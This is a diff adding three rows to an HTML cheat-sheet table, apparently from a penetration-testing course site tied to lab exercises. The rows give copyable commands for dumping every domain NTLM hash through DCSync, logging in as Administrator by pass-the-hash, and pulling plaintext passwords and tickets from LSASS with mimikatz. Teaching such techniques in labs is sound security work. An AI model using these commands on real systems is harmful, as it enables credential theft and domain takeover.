@@ -1045,6 +1045,39 @@
               <td>One password across all users stays under the lockout threshold. Read <code>net accounts</code> first so you don't lock the domain</td>
               <td><a href="./labs/lab11.html#password-spraying" class="badge-lab-ref">Lab 11</a></td>
             </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>impacket-secretsdump -just-dc &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;IP&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('impacket-secretsdump -just-dc <domain>/<user>:<pass>@<IP>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>DCSync: dump every hash</strong></td>
+              <td>An account with replication rights asks the DC for all account data. Dumps every NTLM hash including <code>Administrator</code></td>
+              <td><a href="./labs/lab12.html#dcsync" class="badge-lab-ref">Lab 12</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NTLM_hash&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('evil-winrm -i <IP> -u Administrator -H <NTLM_hash>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Pass-the-Hash login</strong></td>
+              <td><span class="flag-pill">-H</span> passes the NTLM hash straight into the handshake. You log in as Administrator with no password</td>
+              <td><a href="./labs/lab12.html#pass-the-hash" class="badge-lab-ref">Lab 12</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>sekurlsa::logonpasswords</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('sekurlsa::logonpasswords')">Copy</button>
+                </div>
+              </td>
+              <td><strong>mimikatz: dump LSASS</strong></td>
+              <td>On a Windows host as admin, reads plaintext, NTLM hashes, and Kerberos tickets of everyone logged in. <code>lsadump::sam</code> for local accounts</td>
+              <td><a href="./labs/lab12.html#dcsync" class="badge-lab-ref">Lab 12</a></td>
+            </tr>
           </tbody>
         </table>
       </div>
